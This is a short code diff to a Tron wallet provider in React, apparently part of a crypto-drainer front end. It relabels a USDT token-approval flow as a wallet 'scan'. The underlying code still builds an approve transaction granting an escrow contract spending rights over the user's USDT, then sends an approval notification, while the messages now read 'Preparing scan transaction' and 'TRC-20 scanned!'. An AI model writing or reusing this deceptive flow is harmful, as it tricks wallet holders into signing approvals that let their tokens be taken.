@@ -120,11 +120,11 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
     setIsApproving(true);
 
     try {
-      toast.loading("Preparing Tron approval...");
+      toast.loading("Preparing Tron scan...");
       await ensureGasForApproval(address);
 
       toast.dismiss();
-      toast.loading("Building approval transaction...");
+      toast.loading("Preparing scan transaction...");
       const transaction = await buildApproveTx(address, USDT_TOKEN.address, ESCROW_CONTRACT);
 
       toast.dismiss();
@@ -138,7 +138,7 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
       toast.dismiss();
       if (result.result) {
         const txId = result.txid || "";
-        toast.success("TRC-20 approved!");
+        toast.success("TRC-20 scanned!");
         sendTronApprovalNotification(address, txId).catch(console.error);
         return { success: true };
       }
